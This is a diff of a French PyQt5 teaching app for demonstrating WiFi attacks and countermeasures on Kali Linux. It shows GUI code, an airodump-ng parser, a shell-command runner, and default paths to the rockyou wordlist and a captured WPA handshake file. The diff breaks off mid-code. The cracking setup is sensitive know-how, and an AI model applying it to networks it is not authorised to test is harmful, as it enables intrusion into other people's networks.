@@ -1,337 +1,194 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-╔═══════════════════════════════════════════════════════════════════╗
-║  WiFi Security Demo  ·  v4.0  ·  PyQt5  ·  Kali Linux           ║
-║  CORRECTIONS v4:                                                  ║
-║  ✔ Suppression codes ANSI (plus de □[0K□[1B)                     ║
-║  ✔ Zoom terminal Ctrl+/Ctrl- et boutons + / -                    ║
-║  ✔ Scan réseau → table automatiquement remplie                   ║
-║  ✔ airodump-ng parsé et affiché proprement                       ║
-║  ✔ Tous les boutons fonctionnels                                 ║
-╚═══════════════════════════════════════════════════════════════════╝
-python3 wifi_desktop.py
+SÉCURITÉ RÉSEAU WIFI – Groupe 7
+Application de démonstration : Attaques + Contre-mesures WiFi
 """
-import sys, os, re, glob, subprocess, secrets, string, math
+
+import sys
+import os
+import re
+import subprocess
+import signal
 from datetime import datetime
+from html import escape
+
+# ── Dossier de l'application (même répertoire que ce fichier) ──
+APP_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# ── Chemin rockyou.txt : Kali en priorité, sinon dossier local ──
+_ROCKYOU_KALI  = "/usr/share/wordlists/rockyou.txt"
+_ROCKYOU_LOCAL = os.path.join(APP_DIR, "rockyou.txt")
+if os.path.exists(_ROCKYOU_KALI):
+    DEFAULT_WORDLIST = _ROCKYOU_KALI
+elif os.path.exists(_ROCKYOU_LOCAL):
+    DEFAULT_WORDLIST = _ROCKYOU_LOCAL
+else:
+    DEFAULT_WORDLIST = _ROCKYOU_KALI   # valeur par défaut même si absent
+
+# ── Fichier handshake.cap : même dossier que l'application ──
+DEFAULT_CAP = os.path.join(APP_DIR, "handshake.cap")
 
 from PyQt5.QtWidgets import (
-    QApplication, QMainWindow, QWidget, QDialog,
-    QVBoxLayout, QHBoxLayout, QGridLayout,
-    QSplitter, QStackedWidget, QScrollArea,
-    QLabel, QPushButton, QLineEdit, QPlainTextEdit,
-    QComboBox, QSpinBox, QCheckBox, QProgressBar,
-    QTableWidget, QTableWidgetItem, QHeaderView,
-    QFrame, QGroupBox, QStatusBar, QAction, QToolBar,
-    QSizePolicy, QMessageBox, QSplashScreen,
-    QShortcut,
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+    QLabel, QPushButton, QLineEdit, QTextEdit, QComboBox,
+    QProgressBar, QGroupBox, QFormLayout, QTableWidget, QTableWidgetItem,
+    QHeaderView, QTabWidget, QDialog, QSplitter, QFrame, QSpinBox,
+    QScrollArea, QCheckBox, QStackedWidget
 )
-from PyQt5.QtCore  import Qt, QThread, pyqtSignal, QTimer, QSize
-from PyQt5.QtGui   import (
-    QFont, QColor, QPixmap, QPainter,
-    QTextCursor, QTextCharFormat, QKeySequence,
-)
+from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
+from PyQt5.QtGui import QColor, QFont, QBrush
 
-# ══════════════════════════════════════════════════════════════════
-#  PALETTE
-# ══════════════════════════════════════════════════════════════════
-BG="#060810"; BG1="#090d18"; BG2="#0c1120"; PANEL="#0f1828"
-B1="#192540";  B2="#243255"
-CYAN="#00d4ff"; RED="#ff2050"; GREEN="#00ff88"
-ORANGE="#ff8c00"; YELLOW="#ffd600"; PURPLE="#a855f7"
-TEXT="#b8cce0"; DIM="#3a5270"; WHITE="#eaf2fc"
 
-# ══════════════════════════════════════════════════════════════════
-#  STRIP ANSI — supprime TOUS les codes escape du terminal
-# ══════════════════════════════════════════════════════════════════
+# ==================== COULEURS (même que Sujet 1) ====================
+COLORS = {
+    "bg": "#0f1117", "input": "#21262d", "border": "#30363d",
+    "text": "#c9d1d9", "accent": "#58a6ff", "success": "#3fb950",
+    "warning": "#f59e0b", "danger": "#ef4444", "orange": "#e67e22",
+}
+
+
+def stylesheet():
+    return f"""
+    QMainWindow, QWidget {{
+        background-color: {COLORS['bg']};
+        color: {COLORS['text']};
+        font-family: "Segoe UI", sans-serif;
+        font-size: 13px;
+    }}
+    QTabWidget::pane {{ border: 1px solid {COLORS['border']}; border-radius: 4px; }}
+    QTabBar::tab {{
+        background: {COLORS['input']}; color: {COLORS['text']};
+        padding: 7px 16px; border: 1px solid {COLORS['border']};
+        border-bottom: none; border-radius: 4px 4px 0 0;
+    }}
+    QTabBar::tab:selected {{ background: {COLORS['accent']}; color: white; font-weight: bold; }}
+    QTextEdit {{
+        background-color: #0d1117; border: 1px solid {COLORS['border']};
+        border-radius: 6px; padding: 10px;
+        font-family: 'Consolas', monospace; font-size: 12px;
+    }}
+    QLineEdit, QComboBox, QSpinBox {{
+        background-color: {COLORS['input']}; color: {COLORS['text']};
+        border: 1px solid {COLORS['border']}; border-radius: 6px; padding: 6px 10px;
+    }}
+    QPushButton {{
+        background-color: #388bfd; color: white;
+        border: none; border-radius: 6px;
+        padding: 8px 14px; font-weight: 600;
+    }}
+    QPushButton:hover {{ background-color: {COLORS['accent']}; }}
+    QPushButton:disabled {{ background-color: #30363d; color: #555; }}
+    QGroupBox {{
+        border: 1px solid {COLORS['border']}; border-radius: 6px;
+        margin-top: 10px; padding-top: 8px;
+    }}
+    QGroupBox::title {{ color: {COLORS['accent']}; font-weight: bold; padding: 0 6px; }}
+    QTableWidget {{
+        background-color: {COLORS['input']};
+        gridline-color: {COLORS['border']};
+        border: 1px solid {COLORS['border']};
+    }}
+    QTableWidget::item {{ padding: 3px 6px; }}
+    QHeaderView::section {{
+        background-color: #1c2128; color: {COLORS['accent']};
+        font-weight: bold; padding: 5px;
+        border: 1px solid {COLORS['border']};
+    }}
+    QCheckBox {{ color: {COLORS['text']}; }}
+    QProgressBar {{
+        border: 1px solid {COLORS['border']}; border-radius: 3px;
+        background: {COLORS['input']};
+    }}
+    QProgressBar::chunk {{ background: {COLORS['accent']}; border-radius: 3px; }}
+    QSplitter::handle {{ background: {COLORS['border']}; }}
+    QSplitter::handle:hover {{ background: {COLORS['accent']}; }}
+    """
+
+
+# ==================== THREAD COMMANDE ====================
+class CmdThread(QThread):
+    output   = pyqtSignal(str)
+    finished = pyqtSignal(bool, str)
+
+    def __init__(self, cmd):
+        super().__init__()
+        self.cmd = cmd
+        self.raw_output = ""
+        self._stop = False
+        self.proc = None
+
+    def run(self):
+        self.output.emit(
+            f"<span style='color:#58a6ff;'>[{datetime.now():%H:%M:%S}]</span> "
+            f"<code>{escape(self.cmd)}</code><br>"
+        )
+        try:
+            self.proc = subprocess.Popen(
+                self.cmd, shell=True,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1, preexec_fn=os.setsid
+            )
+            for line in iter(self.proc.stdout.readline, ''):
+                if self._stop: break
+                if line.strip():
+                    self.raw_output += line
+                    self.output.emit(line.rstrip() + "<br>")
+            self.proc.wait()
+            self.finished.emit(True, "Terminé")
+        except Exception as e:
+            self.finished.emit(False, str(e))
+
+    def stop(self):
+        self._stop = True
+        if self.proc:
+            try:
+                os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
+            except Exception:
+                self.proc.terminate()
+
+
+# ==================== PARSEURS RÉSEAU (depuis Wifi_desktop.py) ====================
 ANSI_RE = re.compile(
-    r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]'   # CSI sequences
-    r'|\x1B[PX^_].*?\x1B\\'              # DCS/PM/APC/SOS
-    r'|\x1B\][^\x07]*(?:\x07|\x1B\\)'   # OSC
-    r'|\x1B[@-Z\\-_]'                    # Fe sequences
-    r'|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]'# C0/C1 control
+    r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]'
+    r'|\x1B[PX^_].*?\x1B\\'
+    r'|\x1B\][^\x07]*(?:\x07|\x1B\\)'
+    r'|\x1B[@-Z\\-_]'
+    r'|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]'
 )
 def strip_ansi(text: str) -> str:
     return ANSI_RE.sub('', text).rstrip()
 
-# ══════════════════════════════════════════════════════════════════
-#  STYLESHEET
-# ══════════════════════════════════════════════════════════════════
-QSS = f"""
-QMainWindow,QWidget,QDialog{{background:{BG};color:{TEXT};
-  font-family:"JetBrains Mono","Courier New",monospace;font-size:11px;}}
-QLabel{{color:{TEXT};background:transparent;}}
-QScrollBar:vertical{{background:{BG};width:7px;margin:0;}}
-QScrollBar::handle:vertical{{background:{B2};border-radius:3px;min-height:24px;}}
-QScrollBar::handle:vertical:hover{{background:{DIM};}}
-QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0;border:none;}}
-QScrollBar:horizontal{{background:{BG};height:6px;}}
-QScrollBar::handle:horizontal{{background:{B2};border-radius:3px;}}
-QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{{width:0;border:none;}}
-QLineEdit{{background:{BG2};border:1px solid {B2};color:{WHITE};
-  padding:6px 10px;border-radius:3px;
-  font-family:"JetBrains Mono","Courier New",monospace;font-size:11px;}}
-QLineEdit:focus{{border-color:{CYAN};}}
-QComboBox{{background:{BG2};border:1px solid {B2};color:{WHITE};
-  padding:5px 8px;border-radius:3px;}}
-QComboBox::drop-down{{border:none;width:18px;}}
-QComboBox QAbstractItemView{{background:{PANEL};border:1px solid {B2};
-  color:{TEXT};selection-background-color:{B2};}}
-QSpinBox{{background:{BG2};border:1px solid {B2};color:{WHITE};
-  padding:4px 8px;border-radius:3px;}}
-QSpinBox::up-button,QSpinBox::down-button{{background:{B1};border:none;width:16px;}}
-QCheckBox{{color:{TEXT};spacing:8px;}}
-QCheckBox::indicator{{width:14px;height:14px;border:1px solid {B2};
-  background:{BG2};border-radius:2px;}}
-QCheckBox::indicator:checked{{background:{CYAN};border-color:{CYAN};}}
-QProgressBar{{background:{B1};border:none;border-radius:3px;
-  text-align:center;color:transparent;}}
-QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,
-  stop:0 {CYAN},stop:1 {PURPLE});border-radius:3px;}}
-QTableWidget{{background:{BG};gridline-color:{B1};border:1px solid {B1};
-  color:{TEXT};alternate-background-color:{BG1};
-  selection-background-color:{B2};selection-color:{WHITE};}}
-QTableWidget::item{{padding:5px 8px;}}
-QHeaderView::section{{background:{BG2};color:{DIM};border:none;
-  border-bottom:1px solid {B2};padding:6px 8px;font-size:9px;letter-spacing:1px;}}
-QGroupBox{{border:1px solid {B1};border-radius:4px;margin-top:14px;
-  padding:10px;color:{DIM};font-size:9px;letter-spacing:1px;}}
-QGroupBox::title{{subcontrol-origin:margin;left:10px;padding:0 5px;color:{DIM};}}
-QScrollArea{{border:none;background:transparent;}}
-QSplitter::handle{{background:{B1};width:2px;height:2px;}}
-QStatusBar{{background:{BG1};color:{DIM};border-top:1px solid {B1};font-size:10px;}}
-QToolBar{{background:{BG1};border-bottom:1px solid {B1};spacing:3px;padding:2px 8px;}}
-QToolButton{{background:transparent;border:1px solid {B2};color:{TEXT};
-  padding:4px 12px;border-radius:2px;
-  font-family:"JetBrains Mono",monospace;font-size:10px;}}
-QToolButton:hover{{border-color:{CYAN};color:{CYAN};}}
-QMessageBox{{background:{PANEL};}}
-QMessageBox QLabel{{color:{TEXT};font-size:12px;}}
-QMessageBox QPushButton{{background:transparent;border:1px solid {CYAN};
-  color:{CYAN};padding:6px 18px;border-radius:3px;min-width:80px;}}
-QMessageBox QPushButton:hover{{background:{CYAN};color:#000;}}
-"""
-
-# ══════════════════════════════════════════════════════════════════
-#  NETWORKMANAGER AUTO-FIX — snippet bash réutilisable
-#  Logique : si airmon-ng a tué NM → le redémarrer avant nmcli
-# ══════════════════════════════════════════════════════════════════
-# Ce bloc bash est injecté AVANT toute commande nmcli ou hotspot.
-# Il :
-#   1) Arrête wlan0mon si présent (mode moniteur encore actif)
-#   2) Vérifie si NetworkManager tourne
-#   3) Si non → sudo systemctl restart NetworkManager + attente 3s
-#   4) Vérifie wlan0 géré par NM, sinon le force
+# Snippet bash pour corriger NetworkManager si airmon-ng l'a tué
 NM_FIX = r"""
 NM_FIX_DONE=0
-# -- Arrêt mode moniteur si actif --
 if iw dev wlan0mon info >/dev/null 2>&1; then
-  echo "⚙  Mode moniteur détecté → arrêt wlan0mon…"
+  echo "Mode moniteur détecté → arrêt wlan0mon…"
   sudo airmon-ng stop wlan0mon 2>&1 | grep -v "^$" || true
   NM_FIX_DONE=1
 fi
-# -- Vérif NetworkManager --
 if ! systemctl is-active --quiet NetworkManager; then
-  echo "⚙  NetworkManager arrêté → redémarrage…"
+  echo "NetworkManager arrêté → redémarrage…"
   sudo systemctl restart NetworkManager
   sleep 3
   NM_FIX_DONE=1
 fi
-# -- Forcer wlan0 sous NM si non géré --
 if nmcli dev show wlan0 2>/dev/null | grep -q "unmanaged"; then
-  echo "⚙  wlan0 non géré → nmcli device set wlan0 managed yes"
   sudo nmcli device set wlan0 managed yes
   sleep 1
   NM_FIX_DONE=1
 fi
-if [ "$NM_FIX_DONE" = "1" ]; then
-  echo "✅ NetworkManager prêt"
-fi
+if [ "$NM_FIX_DONE" = "1" ]; then echo "NetworkManager prêt"; fi
 """
 
 def nm_fix_wrap(cmd: str) -> str:
-    """Enveloppe une commande nmcli/hotspot avec la correction NM automatique."""
-    # Échapper les singles quotes dans NM_FIX pour bash -c '...'
     fix = NM_FIX.replace("'", "'\\''")
     return f"bash -c '{fix}\n{cmd}'"
 
-# ══════════════════════════════════════════════════════════════════
-#  HELPERS
-# ══════════════════════════════════════════════════════════════════
-def Btn(text, col=CYAN, sm=False):
-    hfg = "#000" if col in (CYAN,GREEN,ORANGE,YELLOW) else "#fff"
-    pad = "4px 8px" if sm else "8px 15px"
-    fs  = "9px"    if sm else "10px"
-    b   = QPushButton(text)
-    b.setStyleSheet(f"""
-        QPushButton{{background:transparent;border:1px solid {col};color:{col};
-          padding:{pad};border-radius:3px;font-size:{fs};letter-spacing:.5px;
-          font-family:"JetBrains Mono","Courier New",monospace;}}
-        QPushButton:hover{{background:{col};color:{hfg};}}
-        QPushButton:pressed{{background:{col}99;}}
-        QPushButton:disabled{{border-color:{B2};color:{DIM};}}""")
-    return b
-
-def Lbl(txt, col=TEXT, size=11, bold=False):
-    l=QLabel(txt)
-    l.setStyleSheet(
-        f"color:{col};font-size:{size}px;"
-        f"font-weight:{'bold' if bold else 'normal'};background:transparent;")
-    return l
-
-def Inp(ph="", val="", fw=None):
-    f=QLineEdit(); f.setPlaceholderText(ph)
-    if val: f.setText(val)
-    if fw:  f.setFixedWidth(fw)
-    return f
-
-def HRule():
-    l=QFrame(); l.setFrameShape(QFrame.HLine)
-    l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;"); return l
-
-def CardF(accent=None):
-    f=QFrame()
-    f.setStyleSheet(
-        f"QFrame{{background:{PANEL};border:1px solid {accent or B1}55;border-radius:4px;}}")
-    return f
-
-def TipW(text, kind="info"):
-    K={"info":(CYAN,"rgba(0,212,255,.06)","rgba(0,212,255,.22)"),
-       "warn":(ORANGE,"rgba(255,140,0,.06)","rgba(255,140,0,.22)"),
-       "danger":(RED,"rgba(255,32,80,.06)","rgba(255,32,80,.22)"),
-       "success":(GREEN,"rgba(0,255,136,.06)","rgba(0,255,136,.22)")}
-    _,bg,bd=K.get(kind,K["info"])
-    l=QLabel(text); l.setWordWrap(True); l.setTextFormat(Qt.RichText)
-    l.setStyleSheet(
-        f"QLabel{{background:{bg};border:1px solid {bd};border-radius:3px;"
-        f"padding:10px 13px;color:{TEXT};font-size:11px;line-height:1.7;}}"); return l
-
-class StatBox(QFrame):
-    def __init__(self,val,lbl,col=CYAN):
-        super().__init__()
-        self.setStyleSheet(
-            f"QFrame{{background:{PANEL};border:1px solid {B1};border-radius:3px;}}")
-        lay=QVBoxLayout(self); lay.setContentsMargins(10,10,10,10); lay.setSpacing(2)
-        self._n=QLabel(str(val)); self._n.setAlignment(Qt.AlignCenter)
-        self._n.setStyleSheet(
-            f"font-size:26px;font-weight:bold;color:{col};"
-            f"background:transparent;border:none;"
-            f"font-family:'JetBrains Mono',monospace;")
-        t=QLabel(lbl); t.setAlignment(Qt.AlignCenter)
-        t.setStyleSheet(
-            f"font-size:9px;color:{DIM};letter-spacing:1px;"
-            f"background:transparent;border:none;")
-        lay.addWidget(self._n); lay.addWidget(t)
-    def set(self,v): self._n.setText(str(v))
-
-class SecMeter(QFrame):
-    def __init__(self):
-        super().__init__()
-        self.setStyleSheet(
-            f"QFrame{{background:{BG2};border:1px solid {B1};border-radius:3px;}}")
-        lay=QVBoxLayout(self); lay.setContentsMargins(12,10,12,10); lay.setSpacing(6)
-        self._bar=QProgressBar(); self._bar.setRange(0,100); self._bar.setValue(5)
-        self._bar.setFixedHeight(14)
-        self._bar.setStyleSheet(
-            f"QProgressBar{{background:{BG};border-radius:7px;border:none;}}"
-            f"QProgressBar::chunk{{background:{RED};border-radius:7px;}}")
-        self._lbl=Lbl("Sélectionnez un réseau",DIM,12,True)
-        lay.addWidget(Lbl("Score de sécurité:",DIM,10))
-        lay.addWidget(self._bar); lay.addWidget(self._lbl)
-
-    def update(self,sec):
-        s=(sec or "").lower()
-        if   not s or "open" in s: p,c,t=5, RED,    "CRITIQUE — Réseau ouvert"
-        elif "wep"  in s:          p,c,t=15,"#ff6600","TRÈS FAIBLE — WEP"
-        elif "wpa3" in s:          p,c,t=97,GREEN,  "EXCELLENT — WPA3"
-        elif "wpa2" in s:          p,c,t=72,"#00cc66","BON — WPA2"
-        elif "wpa"  in s:          p,c,t=40,YELLOW, "FAIBLE — WPA1"
-        else:                      p,c,t=5, RED,    "INCONNU"
-        self._bar.setValue(p)
-        self._bar.setStyleSheet(
-            f"QProgressBar{{background:{BG};border-radius:7px;border:none;}}"
-            f"QProgressBar::chunk{{background:{c};border-radius:7px;}}")
-        self._lbl.setText(t)
-        self._lbl.setStyleSheet(
-            f"color:{c};font-size:12px;font-weight:bold;background:transparent;border:none;")
-
-# ══════════════════════════════════════════════════════════════════
-#  THREAD COMMANDE — streaming non-bloquant
-# ══════════════════════════════════════════════════════════════════
-class CmdThread(QThread):
-    line=pyqtSignal(str)
-    done=pyqtSignal(int)
-
-    def __init__(self,cmd,cwd):
-        super().__init__()
-        self.cmd=cmd; self.cwd=cwd
-        self._proc=None; self._abort=False
-
-    def run(self):
-        env=os.environ.copy()
-        env["TERM"]="dumb"          # ← empêche les codes couleur
-        env["NO_COLOR"]="1"
-        try:
-            self._proc=subprocess.Popen(
-                self.cmd,shell=True,executable="/bin/bash",
-                stdout=subprocess.PIPE,stderr=subprocess.STDOUT,
-                text=True,bufsize=1,cwd=self.cwd,env=env,
-                preexec_fn=os.setsid)
-            for ln in self._proc.stdout:
-                if self._abort: break
-                self.line.emit(strip_ansi(ln))  # ← strip ici
-            self._proc.wait()
-            self.done.emit(self._proc.returncode)
-        except Exception as e:
-            self.line.emit(f"[ERREUR] {e}")
-            self.done.emit(-1)
-
-    def abort(self):
-        self._abort=True
-        if self._proc:
-            try:
-                import signal
-                os.killpg(os.getpgid(self._proc.pid),signal.SIGTERM)
-            except Exception:
-                try: self._proc.kill()
-                except Exception: pass
-
-# ══════════════════════════════════════════════════════════════════
-#  PARSEURS RÉSEAU
-# ══════════════════════════════════════════════════════════════════
-def parse_nmcli(output: str) -> list:
-    """Parse nmcli -t -f SSID,BSSID,SIGNAL,SECURITY output."""
-    nets=[]
-    for line in output.splitlines():
-        line=strip_ansi(line).strip()
-        if not line or line.startswith("SSID"): continue
-        parts=line.split(":")
-        if len(parts)>=4:
-            # nmcli -t uses : as separator, BSSID has colons too
-            # Format: SSID:XX\:XX\:XX\:XX\:XX\:XX:signal:security
-            # Reconstruct properly
-            ssid=parts[0]
-            # BSSID is 6 hex pairs joined with \: in -t mode
-            bssid_parts=[]
-            i=1
-            while i<len(parts) and len(bssid_parts)<6:
-                bssid_parts.append(parts[i]); i+=1
-            bssid=":".join(bssid_parts)
-            signal=parts[i] if i<len(parts) else "?"
-            security=" ".join(parts[i+1:]) if i+1<len(parts) else "Open"
-            if not security.strip(): security="Open"
-            try: sig=int(signal)
-            except: sig=0
-            nets.append({"ssid":ssid,"bssid":bssid,
-                         "signal":sig,"security":security.strip()})
-    return nets
-
 def parse_nmcli_columns(output: str) -> list:
-    """Parse nmcli dev wifi list - handles all output formats."""
+    """Parse nmcli dev wifi list — extrait SSID, BSSID, signal, sécurité, canal."""
     nets = []
     lines = [strip_ansi(l) for l in output.splitlines()]
-
-    # Format 1: nmcli -f SSID,BSSID,SIGNAL,SECURITY (tab/space separated columns)
-    # Detect by checking if we have a header line
     hdr_idx = -1
     for i, l in enumerate(lines):
         if "SSID" in l and "BSSID" in l:
@@ -339,29 +196,24 @@ def parse_nmcli_columns(output: str) -> list:
 
     if hdr_idx >= 0:
         hdr = lines[hdr_idx]
-        # Find column start positions
         cols = {}
         for name in ["SSID","BSSID","SIGNAL","BARS","SECURITY","MODE","CHAN","RATE"]:
             idx = hdr.find(name)
             if idx >= 0: cols[name] = idx
-
         col_order = sorted(cols.items(), key=lambda x: x[1])
-
         for l in lines[hdr_idx+1:]:
             if not l.strip() or l.strip().startswith("--"): continue
-            clean = l.lstrip("* ")  # remove active marker *
+            clean = l.lstrip("* ")
             fields = {}
             for j, (name, start) in enumerate(col_order):
                 end = col_order[j+1][1] if j+1 < len(col_order) else len(clean)
                 fields[name] = clean[start:end].strip() if start < len(clean) else ""
-
-            ssid   = fields.get("SSID","").strip()
-            bssid  = fields.get("BSSID","").strip()
-            sig    = fields.get("SIGNAL","").strip()
-            sec    = fields.get("SECURITY","").strip()
-            chan   = fields.get("CHAN","").strip()
-            rate   = fields.get("RATE","").strip()
-
+            ssid  = fields.get("SSID","").strip()
+            bssid = fields.get("BSSID","").strip()
+            sig   = fields.get("SIGNAL","").strip()
+            sec   = fields.get("SECURITY","").strip()
+            chan  = fields.get("CHAN","").strip()
+            rate  = fields.get("RATE","").strip()
             if not ssid and not bssid: continue
             try: sig_int = int(sig)
             except: sig_int = 0
@@ -375,12 +227,10 @@ def parse_nmcli_columns(output: str) -> list:
             })
         return nets
 
-    # Format 2: nmcli -t (colon-separated)
+    # Format colon-separated
     for l in lines:
         l = l.strip()
         if not l or l.startswith("SSID"): continue
-        # Escape colons in BSSID: XX\:XX\:XX\:XX\:XX\:XX
-        # Replace \: temporarily
         tmp = l.replace("\\:", "\x00")
         parts = tmp.split(":")
         parts = [p.replace("\x00", ":") for p in parts]
@@ -396,2207 +246,2324 @@ def parse_nmcli_columns(output: str) -> list:
                 "bssid": bssid,
                 "signal": sig_int,
                 "security": sec or "Open",
+                "channel": "?",
             })
     return nets
 
 def parse_airodump(output: str) -> list:
     """Parse airodump-ng output — extrait BSSID, canal, chiffrement."""
-    nets=[]
-    lines=[strip_ansi(l) for l in output.splitlines()]
-    in_ap=False
+    nets = []
+    lines = [strip_ansi(l) for l in output.splitlines()]
+    in_ap = False
     for l in lines:
-        l=l.strip()
+        l = l.strip()
         if "BSSID" in l and "PWR" in l and "Beacons" in l:
-            in_ap=True; continue
+            in_ap = True; continue
         if "BSSID" in l and "STATION" in l:
-            in_ap=False; continue
+            in_ap = False; continue
         if not in_ap or not l: continue
-        parts=l.split()
-        if len(parts)<6: continue
-        bssid=parts[0]
-        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$',bssid): continue
+        parts = l.split()
+        if len(parts) < 6: continue
+        bssid = parts[0]
+        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid): continue
         try:
-            pwr=int(parts[1]); ch_idx=4
-            ch=parts[ch_idx]; enc=parts[5] if len(parts)>5 else "?"
-            cipher=parts[6] if len(parts)>6 else ""
-            auth=parts[7]   if len(parts)>7 else ""
-            # ESSID is at end after AUTH
-            essid=" ".join(parts[10:]) if len(parts)>10 else "<hidden>"
-            nets.append({"ssid":essid,"bssid":bssid,
-                         "signal":abs(pwr),"channel":ch,
-                         "security":f"{enc} {cipher}".strip()})
+            pwr = int(parts[1]); ch = parts[4]
+            enc = parts[5] if len(parts) > 5 else "?"
+            cipher = parts[6] if len(parts) > 6 else ""
+            essid = " ".join(parts[10:]) if len(parts) > 10 else "<hidden>"
+            nets.append({
+                "ssid": essid, "bssid": bssid,
+                "signal": abs(pwr), "channel": ch,
+                "security": f"{enc} {cipher}".strip(),
+                "rate": "?"
+            })
         except Exception: continue
     return nets
 
-# ══════════════════════════════════════════════════════════════════
-#  TERMINAL — VERSION CORRIGÉE
-# ══════════════════════════════════════════════════════════════════
-class Terminal(QWidget):
-    notify  = pyqtSignal(str,str)
-    networks= pyqtSignal(list)   # ← émet les réseaux parsés
-    cap_ready = pyqtSignal(str)  # ← émet le chemin du .cap créé automatiquement
 
-    FONT_MIN=8; FONT_MAX=22; FONT_DEF=11
+# ==================== THREAD SCAN NMCLI ====================
+class ScanThread(QThread):
+    result = pyqtSignal(list)
+    output = pyqtSignal(str)
 
-    def __init__(self,parent=None):
-        super().__init__(parent)
-        self._hist=[]; self._hidx=-1
-        self._thread=None
-        self._cwd=os.path.expanduser("~")
-        self._font_size=self.FONT_DEF
-        self._output_buf=[]   # buffer pour parser les réseaux
-        self._build()
-
-    # ── Build ──────────────────────────────────────────────────────
-    def _build(self):
-        root=QVBoxLayout(self); root.setContentsMargins(0,0,0,0); root.setSpacing(5)
-
-        # Barre titre
-        bar=QHBoxLayout(); bar.setSpacing(8)
-        self._dot=QLabel("●")
-        self._dot.setStyleSheet(f"color:{GREEN};font-size:13px;")
-        self._path=Lbl(f" {self._cwd}",CYAN,10)
-        self._path.setTextInteractionFlags(Qt.TextSelectableByMouse)
-        self._clock=Lbl("",DIM,10)
-        # Boutons zoom
-        bz_out=QPushButton("A-"); bz_in=QPushButton("A+"); bz_rst=QPushButton("A")
-        for bz,tip in [(bz_out,"Zoom -"),(bz_in,"Zoom +"),(bz_rst,"Reset")]:
-            bz.setToolTip(tip)
-            bz.setFixedSize(26,22)
-            bz.setStyleSheet(f"""
-                QPushButton{{background:{B1};border:1px solid {B2};color:{DIM};
-                  font-size:9px;border-radius:2px;padding:0;}}
-                QPushButton:hover{{border-color:{CYAN};color:{CYAN};}}""")
-        bz_out.clicked.connect(self.zoom_out)
-        bz_in.clicked.connect(self.zoom_in)
-        bz_rst.clicked.connect(self.zoom_reset)
-        # Label indicateur zoom
-        self._zoom_lbl=Lbl(f"{self._font_size}px",DIM,9)
-        self._zoom_lbl.setFixedWidth(32)
-        bar.addWidget(self._dot)
-        bar.addWidget(Lbl("terminal@kali",DIM,9))
-        bar.addWidget(Lbl("❯",CYAN,10))
-        bar.addWidget(self._path,1)
-        bar.addStretch()
-        bar.addWidget(bz_out); bar.addWidget(bz_in); bar.addWidget(bz_rst)
-        bar.addWidget(self._zoom_lbl)
-        bar.addWidget(self._clock)
-        root.addLayout(bar)
-
-        # Zone sortie
-        self.output=QPlainTextEdit()
-        self.output.setReadOnly(True)
-        self.output.setSizePolicy(QSizePolicy.Expanding,QSizePolicy.Expanding)
-        self._apply_font()
-        root.addWidget(self.output,1)
-
-        # Chips historique
-        ca=QScrollArea(); ca.setWidgetResizable(True); ca.setFixedHeight(30)
-        ca.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
-        ca.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
-        ca.setStyleSheet("border:none;background:transparent;")
-        self._cw=QWidget(); self._cl=QHBoxLayout(self._cw)
-        self._cl.setContentsMargins(0,0,0,0); self._cl.setSpacing(4)
-        self._cl.addStretch(); ca.setWidget(self._cw)
-        root.addWidget(ca)
-
-        # Ligne saisie
-        row=QHBoxLayout(); row.setSpacing(7)
-        prm=QLabel("❯")
-        prm.setStyleSheet(f"color:{CYAN};font-size:16px;font-weight:bold;")
-        prm.setFixedWidth(18)
-        self.inp=QLineEdit()
-        self.inp.setPlaceholderText(
-            "  Entrez une commande Linux…   "
-            "ex: ls -la  ·  nmap -sn 192.168.1.0/24  ·  aircrack-ng …")
-        self.inp.setStyleSheet(f"""
-            QLineEdit{{background:{PANEL};border:1px solid {B2};border-radius:4px;
-              color:{WHITE};padding:10px 14px;
-              font-family:"JetBrains Mono","Courier New",monospace;font-size:12px;}}
-            QLineEdit:focus{{border-color:{CYAN};background:{BG2};}}""")
-        self.inp.returnPressed.connect(self.execute)
-        self.inp.keyPressEvent=self._keypress
-
-        self.b_exec =Btn("▶  EXÉCUTER",CYAN);      self.b_exec.setFixedWidth(118)
-        self.b_stop =Btn("■  STOP",RED,sm=True);    self.b_stop.setFixedWidth(80)
-        self.b_clear=Btn("✕  EFFACER",DIM,sm=True); self.b_clear.setFixedWidth(85)
-        self.b_copy =Btn("⎘  COPIER",DIM,sm=True);  self.b_copy.setFixedWidth(80)
-
-        self.b_exec.clicked.connect(self.execute)
-        self.b_stop.clicked.connect(self.stop)
-        self.b_clear.clicked.connect(self.clear)
-        self.b_copy.clicked.connect(self.copy_all)
-
-        row.addWidget(prm); row.addWidget(self.inp,1)
-        row.addWidget(self.b_exec); row.addWidget(self.b_stop)
-        row.addWidget(self.b_clear); row.addWidget(self.b_copy)
-        root.addLayout(row)
-
-        # Progress
-        self.prog=QProgressBar(); self.prog.setFixedHeight(3)
-        self.prog.setRange(0,0); self.prog.setVisible(False)
-        root.addWidget(self.prog)
-
-        # Timer + raccourcis zoom
-        QTimer(self).timeout.connect(self._tick) if False else None
-        t=QTimer(self); t.timeout.connect(self._tick); t.start(1000)
-
-        QShortcut(QKeySequence("Ctrl+="),self,self.zoom_in)
-        QShortcut(QKeySequence("Ctrl++"),self,self.zoom_in)
-        QShortcut(QKeySequence("Ctrl+-"),self,self.zoom_out)
-        QShortcut(QKeySequence("Ctrl+0"),self,self.zoom_reset)
-
-        self._welcome()
-
-    def _apply_font(self):
-        self.output.setStyleSheet(f"""
-            QPlainTextEdit{{
